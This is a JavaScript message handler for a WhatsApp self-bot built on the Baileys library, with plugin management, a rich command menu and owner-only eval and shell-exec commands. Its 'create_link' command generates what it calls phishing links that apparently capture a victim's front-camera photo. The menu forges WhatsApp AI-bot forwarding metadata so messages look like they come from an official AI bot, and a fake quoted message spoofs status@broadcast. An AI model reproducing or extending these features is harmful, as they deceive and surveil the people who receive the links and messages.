process.on('uncaughtException', console.error)

require('./config.js')
const fs = require('fs')
const util = require('util')
const path = require('path');
const axios = require('axios')
const moment = require("moment-timezone");
const pluginManager = require('./lib/pluginManager.js');

const {
    exec,
    spawn,
    execSync
} = require("child_process")
const {
    smsg,
    runtime,
    getTime,
    sleep,
    clockString,
    fetchJson,
    getBuffer,
    parseMention,
    getGroupAdmins
} = require('./lib/fungsi.js')
const { v4: uuidv4 } = require('uuid');
const { color } = require('./lib/color.js')
const { randomBytes, randomUUID } = require('crypto');

let generateWAMessageFromContent;
async function getGenerateWAMessageFromContent() {
  if (!generateWAMessageFromContent) {
    try {
      const baileys = await import('@whiskeysockets/baileys');
      generateWAMessageFromContent = baileys.generateWAMessageFromContent;
    } catch (e) {}
  }
  return generateWAMessageFromContent;
}

let codeToTokens;

const COLOR_MAP = {
  "#CB7676": "KEYWORD",
  "#4D9375": "KEYWORD",
  "#BD976A": "KEYWORD",
  "#AB5959": "KEYWORD",
  "#80A665": "METHOD",
  "#B8A965": "METHOD",
  "#59C639": "METHOD",
  "#569CD6": "METHOD",
  "#C98A7D77": "STR",
  "#C98A7D": "STR",
  "#CE9178": "STR",
  "#4C9A91": "NUMBER",
  "#B5CEA8": "NUMBER",
  "#758575DD": "COMMENT",
  "#758575": "COMMENT",
  "#6A9955": "COMMENT",
  "#5C6370": "COMMENT"
};

function getTokenType(hexColor) {
  if (!hexColor) return "DEFAULT";
  const upper = hexColor.toUpperCase();
  if (COLOR_MAP[upper]) return COLOR_MAP[upper];
  if (COLOR_MAP[hexColor]) return COLOR_MAP[hexColor];
  
  if (/#(CB|BD|4D|AB)/i.test(hexColor)) return "KEYWORD";
  if (/#(80|B8|59|56)/i.test(hexColor)) return "METHOD";
  if (/#(C9|CE)/i.test(hexColor)) return "STR";
  if (/#(4C|B5)/i.test(hexColor)) return "NUMBER";
  if (/#(75|5C|6A)/i.test(hexColor)) return "COMMENT";
  return "DEFAULT";
}

async function tokenize(code, language = "javascript", displayLabel = null) {
  if (!codeToTokens) {
    try {
      const shiki = await import("shiki");
      codeToTokens = shiki.codeToTokens;
    } catch (e) {}
  }

  if (codeToTokens) {
    try {
      const tokens = (await codeToTokens(code, {
        lang: language,
        theme: "vitesse-dark"
      })).tokens.map((line) => {
        return line.map(({ content, color }) => {
          return {
            content,
            type: getTokenType(color)
          };
        });
      }).flatMap((value, index, original) => {
        return index === original.length - 1
          ? value
          : [
            ...value,
            {
              content: "\n",
              type: "DEFAULT"
            }
          ]
      });

      return {
        view_model: {
          primitive: {
            language: displayLabel || language,
            code_blocks: tokens,
            __typename: "GenAICodeUXPrimitive"
          },
          __typename: "GenAISingleLayoutViewModel"
        }
      };
    } catch (e) {}
  }

  const simpleTokens = code.split('\n').map((line, idx, arr) => {
    return [
      { content: line, type: "DEFAULT" },
      ...(idx < arr.length - 1 ? [{ content: "\n", type: "DEFAULT" }] : [])
    ];
  }).flat();

  return {
    view_model: {
      primitive: {
        language: displayLabel || language,
        code_blocks: simpleTokens,
        __typename: "GenAICodeUXPrimitive"
      },
      __typename: "GenAISingleLayoutViewModel"
    }
  };
}

//datase
global.db.data = JSON.parse(fs.readFileSync('./src/database.json'));
if (global.db.data) global.db.data = {
    users: {},
    phising: {},
    ...(global.db.data || {})
};

module.exports = bob = async (bob, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''

        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefixMatch = global.prefa ? global.prefa.find(p => body.startsWith(p)) : undefined
        var prefix = prefixMatch !== undefined ? prefixMatch : (global.prefa && global.prefa[0] !== undefined ? global.prefa[0] : '!')
        const time = moment(Date.now()).tz('Asia/Makassar').locale('id').format('DD/MM/YY HH:mm:ss z')
        const dt = moment(Date.now()).tz('Asia/Makassar').locale('id').format('a')
        const ucapanWaktu = "Selamat " + dt.charAt(0).toUpperCase() + dt.slice(1) + "👋"
        const isCmd = prefixMatch !== undefined && body.length > 0
        const command = isCmd ? body.slice(prefixMatch.length).trim().split(/ +/).shift().toLowerCase() : body.trim().split(/ +/).shift().toLowerCase()
        const CmD = aliases = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await bob.decodeJid(bob.user.id)
        const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)

        //** Group
        const groupMetadata = m.isGroup ? await bob.groupMetadata(m.chat).catch(e => { }) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

        bob.sendFakePreviewImg = async (txt, title_, desc, img_url) => {
            let send = {
                text: txt,
                contexInfo: {
                    externalAdReply: {
                        title: title_,
                        body: desc,
                        thumbnail: await getBuffer(img_url),
                        mediaUrl: img_url,
                        //renderLargerThumbnail: true,
                        //showAdAttribution: false,
                        mediaType: 2
                    }
                }
            }
            await bob.sendMessage(m.chat, send, { quoted: m })
        }


        //** fake reply        
        const fake = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "status@broadcast" //status@broadcast
                } : {})
            },
            message: {
                "extendedTextMessage": {
                    "text": `Di buat dengan Java Script`,
                    "title": `Hmm`,
                    'jpegThumbnail': global.thumb
                }
            }
        }

        //** cmd
        const CmDPlugins = isCmd ? body.slice(prefixMatch.length).trim().split(/ +/).shift().toLowerCase() : null

        // ** plugins
        for (let name in plugins) {
            let plugin = plugins[name];
            if (!plugin) continue;
            let turn = plugin.aliases instanceof Array ?
                plugin.aliases.includes(CmDPlugins) :
                plugin.aliases instanceof String ?
                    plugin.aliases == CmDPlugins :
                    false;
            if (!turn) continue;
            try {
                await plugin.exec(m, {
                    bob,
                    qmsg,
                    budy,
                    quoted,
                    pushname,
                    args,
                    CmD,
                    aliases,
                    text,
                    prefix,
                    command,
                    mime
                });
                pluginManager.handleExecutionSuccess(name);
            } catch (e) {
                console.error(`Error executing plugin ${name}:`, e);
                const res = pluginManager.handleExecutionError(name, e, { command: CmDPlugins });
                if (res.isRealError) {
                    bob.sendText(m.chat, `⚠️ *PLUGIN ERROR TERDETEKSI*\nPlugin *${name}* telah mengalami error 5 kali berturut-turut (${res.errorDetail.errorType}) dan telah dimasukkan ke daftar plugin error.\n\n*Log:* ${res.errorDetail.errorMessage}`, m);
                } else {
                    bob.sendText(m.chat, `Upss... terjadi kesalahan saat menjalankan plugin (${res.failuresCount}/5 kali berturut-turut)\nLog kesalahan:\n${e}`, m);
                }
            }
        }


        // console logs pc        
        if (!m.isGroup && isCmd) console.log(color('├', 'white'), color('NAMA', 'red'), color(pushname, 'yellow'), color('MENGGUNAKAN', 'white'), color('FITUR :', 'red'), color(command, 'lime'), 'args :', color(args.length))

        // console logs gc
        if (isCmd && m.isGroup) console.log(color('├', 'white'), color('NAMA', 'red'), color(pushname, 'yellow'), color('MENGGUNAKAN', 'white'), color('FITUR :', 'red'), color(command, 'lime'), color(`Di Group ${groupName}`, 'yellow'), 'args :', color(args.length))


        switch (command) {


            case 'bob':
            case 'help':
            case 'menu': {
                const stats = pluginManager.getStats();
                const activePlugins = Object.values(plugins);
                const commandsByCategory = {};

                activePlugins.forEach(plugin => {
                    if (!plugin) return;
                    const { CmD, categori, filename } = plugin;
                    if (!CmD || !Array.isArray(CmD)) return;

                    let cat = categori ? categori.toString().toLowerCase().trim() : '';
                    if (!cat && filename) {
                        // Fallback inspection based on filename prefix if category field is omitted
                        const match = filename.match(/^(dl|game|maker|anime|search|convert)/i);
                        if (match) {
                            const prefixMap = {
                                dl: 'downloader',
                                game: 'game',
                                maker: 'maker',
                                anime: 'anime',
                                search: 'search',
                                convert: 'maker'
                            };
                            cat = prefixMap[match[1].toLowerCase()] || 'other';
                        } else {
                            cat = 'other';
                        }
                    } else if (!cat) {
                        cat = 'other';
                    }

                    if (!commandsByCategory[cat]) {
                        commandsByCategory[cat] = [];
                    }

                    commandsByCategory[cat].push(...CmD.map(cmd => `${prefix}${cmd}`));
                });

                // Built-in system & owner commands
                const systemCommands = ['runtime', 'del', 'send', 'create_link', 'listerror', 'getcode', 'savecode', 'retryplugin'];
                commandsByCategory['system'] = systemCommands.map(cmd => `${prefix}${cmd}`);

                let headerText = `Halo *${pushname}* 👋${ucapanWaktu}\n\nActive Plugins: \`${stats.activeCount} / ${stats.totalPlugins}\`\nErrored Plugins: \`${stats.erroredCount}\`\nPrefix: \`${prefix}\``;

                const sections = [
                    {
                        view_model: {
                            primitive: {
                                text: headerText,
                                __typename: "GenAIMarkdownTextUXPrimitive"
                            },
                            __typename: "GenAISingleLayoutViewModel"
                        }
                    }
                ];

                let fallbackCodeBlocks = '';

                // Build a SEPARATE code section primitive for EACH category
                for (const [category, commands] of Object.entries(commandsByCategory)) {
                    const catUpper = category.toUpperCase();

                    let catSnippet = '';
                    
                    commands.forEach(cmd => {
                        let hashtagCmd = cmd;
                        if (cmd.startsWith('.')) {
                            hashtagCmd = '#' + cmd.slice(1);
                        } else if (!cmd.startsWith('#')) {
                            hashtagCmd = '#' + cmd;
                        }
                        const cleanName = cmd.replace(/^[.#]/, '');
                        catSnippet += `${hashtagCmd}\n`;
                    });

                    catSnippet = catSnippet.trimEnd();

                    // Pass custom displayLabel so the UI header displays the Category Name instead of "JAVASCRIPT"
                    const catCodeSection = await tokenize(catSnippet, "javascript", `📁${catUpper}`);
                    sections.push(catCodeSection);

                    const hashtagList = commands.map(c => c.startsWith('.') ? '#' + c.slice(1) : (c.startsWith('#') ? c : '#' + c));
                    fallbackCodeBlocks += `\`\`\`javascript\n/* 📂 KATEGORI MENU: ${catUpper} */\n${hashtagList.map(h => `${h} = "Active"`).join('\n')}\n\`\`\`\n\n`;
                }

                const messageContextInfo = {
                    botMessageSecret: randomBytes(32),
                    botMetadata: {
                        messageDisclaimerText: "Self-Bot by Febriansyah"
                    }
                };

                const unified = {
                    response_id: randomUUID(),
                    sections: sections
                };

                const richResponseMessage = {
                    submessages: [],
                    messageType: 1,
                    unifiedResponse: {
                        data: Buffer.from(JSON.stringify(unified))
                    }
                };

                try {
                    const genMsgFunc = await getGenerateWAMessageFromContent();
                    if (!genMsgFunc) throw new Error('Fungsi generateWAMessageFromContent tidak tersedia');

                    const waMsg = genMsgFunc(m.chat, {
                        messageContextInfo,
                        botForwardedMessage: {
                            message: {
                                richResponseMessage: {
                                    ...richResponseMessage,
                                    contextInfo: {
                                        forwardingScore: 1,
                                        isForwarded: true,
                                        forwardedAiBotMessageInfo: {
                                            botJid: "867051314767696@bot"
                                        },
                                        forwardOrigin: 4,
                                        botMessageSharingInfo: {
                                            botEntryPointOrigin: 2,
                                            forwardScore: 1
                                        },
                                        ...(m ? {
                                            stanzaId: m.key.id,
                                            participant: m.participant || m.key.participant || m.key.remoteJid,
                                            quotedMessage: m.message,
                                            quotedType: 0
                                        } : {})
                                    }
                                }
                            }
                        }
                    }, {});

                    await bob.relayMessage(m.chat, waMsg.message, {
                        messageId: waMsg.key.id
                    });
                } catch (err) {
                    console.error('Error sending rich menu:', err);
                    let fallbackMsg = `${headerText}\n\n${fallbackCodeBlocks}`;
                    await bob.sendMessage(m.chat, { text: fallbackMsg }, { quoted: m });
                }
            }
                break

            case 'listerror':
            case 'pluginerror': {
                if (!isCreator) return m.reply(mess.owner);
                const stats = pluginManager.getStats();
                if (stats.erroredCount === 0) {
                    return m.reply(`✅ *Tidak ada plugin yang error!* Semua ${stats.activeCount} plugin berjalan normal.`);
                }
                let msg = `⚠️ *DAFTAR PLUGIN ERROR (${stats.erroredCount}/${stats.totalPlugins})*\n\n`;
                Object.values(stats.erroredPlugins).forEach((item, index) => {
                    msg += `${index + 1}. *${item.filename}*\n`;
                    msg += `   • Tipe: _${item.errorType}_\n`;
                    msg += `   • Waktu: _${item.lastErrorTime}_\n`;
                    msg += `   • Pesan: ${item.errorMessage}\n\n`;
                });
                msg += `Gunakan *${prefix}logerror <nama_file>* untuk melihat detail stack trace.\nGunakan *${prefix}getcode <nama_file>* untuk melihat isi kode.`;
                m.reply(msg);
            }
                break;

            case 'logerror': {
                if (!isCreator) return m.reply(mess.owner);
                if (!text) return m.reply(`Gunakan: ${prefix + command} <nama_file.js>`);
                const filename = text.trim().endsWith('.js') ? text.trim() : text.trim() + '.js';
                const errorInfo = global.pluginErrors[filename];
                if (!errorInfo) return m.reply(`Plugin *${filename}* tidak ditemukan di daftar error.`);
                let msg = `🔍 *DETAIL ERROR PLUGIN: ${filename}*\n\n`;
                msg += `*Tipe:* ${errorInfo.errorType}\n`;
                msg += `*Waktu:* ${errorInfo.lastErrorTime}\n`;
                msg += `*Pesan:* ${errorInfo.errorMessage}\n\n`;
                msg += `*Stack Trace:*\n\`\`\`${errorInfo.stackTrace}\`\`\``;
                m.reply(msg);
            }
                break;

            case 'getcode': {
                if (!isCreator) return m.reply(mess.owner);
                if (!text) return m.reply(`Gunakan: ${prefix + command} <nama_file.js>`);
                const filename = text.trim().endsWith('.js') ? text.trim() : text.trim() + '.js';
                try {
                    const code = pluginManager.getPluginCode(filename);
                    m.reply(`📄 *KODE PLUGIN: ${filename}*\n\n\`\`\`javascript\n${code}\n\`\`\``);
                } catch (e) {
                    m.reply(`❌ ${e.message}`);
                }
            }
                break;

            case 'savecode': {
                if (!isCreator) return m.reply(mess.owner);
                const match = text.match(/^(\S+)\s+([\s\S]+)$/);
                if (!match) return m.reply(`Gunakan: ${prefix + command} <nama_file.js> <kode_baru>`);
                const filename = match[1].endsWith('.js') ? match[1] : match[1] + '.js';
                const newCode = match[2];
                try {
                    const result = pluginManager.savePluginCode(filename, newCode);
                    if (result && result.success) {
                        m.reply(`✅ Plugin *${filename}* berhasil diperbarui dan dimuat kembali!`);
                    } else if (result && result.error) {
                        m.reply(`⚠️ Kode disimpan, namun plugin mengalami error saat dimuat:\n\n*${result.error.errorType}:* ${result.error.errorMessage}`);
                    } else {
                        m.reply(`✅ Plugin *${filename}* berhasil disimpan.`);
                    }
                } catch (e) {
                    m.reply(`❌ Gagal menyimpan plugin: ${e.message}`);
                }
            }
                break;

            case 'retryplugin': {
                if (!isCreator) return m.reply(mess.owner);
                if (!text) return m.reply(`Gunakan: ${prefix + command} <nama_file.js>`);
                const filename = text.trim().endsWith('.js') ? text.trim() : text.trim() + '.js';
                const res = pluginManager.resetPluginError(filename);
                if (res && res.success) {
                    m.reply(`✅ Plugin *${filename}* berhasil dimuat ulang dan aktif kembali!`);
                } else if (res && res.error) {
                    m.reply(`❌ Plugin *${filename}* masih mengalami error:\n${res.error.errorMessage}`);
                } else {
                    m.reply(`⚠️ Gagal mencoba memuat *${filename}*. Periksa keberadaan file.`);
                }
            }
                break;

            case 'runtime':
                console.log(runtime())
                break

            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                bob.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
                break


            case 'send': {
                if (!isCreator) return m.reply(mess.owner)
                if (!text) return m.reply('❎')
                await bob.sendFileUrl(m.chat, text, '', m)
            }
                break

            case 'create_link': {
                let url = args[0]
                if (!url) return m.reply(`Sertakan URL tujuan. Contoh: ${prefix}create_link https://google.com`);
                if (!/^https?:\/\//i.test(url)) url = 'http://' + url;
                let id = uuidv4().slice(0, 8);
                global.db.data.phising[id] = {
                    id: id,
                    uid: m.sender,
                    type: 'photo',
                    mode: 'front',
                    url: url
                }
                m.reply(`Link phising berhasil dibuat!\n\nUntuk mengetes di localhost, buka URL ini di browser PC-mu:\nhttp://localhost:8080/${id}`);
            }
                break

            default:

                if (body.startsWith('=>')) {
                    if (!isCreator) return

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return bob.sendText(m.chat, bang, m)
                    }
                    try {
                        bob.sendText(m.chat, util.format(eval(`(async () => { return ${body.slice(3)} })()`)), m)
                    } catch (e) {
                        bob.sendText(m.chat, String(e), m)
                    }
                }

                if (body.startsWith('>')) {
                    if (!isCreator) return
                    try {
                        let evaled = await eval(text)
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await bob.sendText(m.chat, util.format(evaled), m)
                    } catch (err) {
                        await bob.sendText(m.chat, String(err), m)
                        console.log(err)
                    }
                }

                if (body.startsWith('$')) {
                    if (!isCreator) return m.reply(
                        mess.owner
                    )
                    exec(text, (err, stdout) => {
                        if (err) return bob.sendText(m.chat, `${err}`, m)
                        if (stdout) return bob.sendText(m.chat, stdout, m)
                    })
                }


        }

    } catch (err) {
        bob.sendText(m.chat, util.format(err), m)
        console.log(err)
    }

}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`update ${__filename}`)
    delete require.cache[file]
    require(file)
})
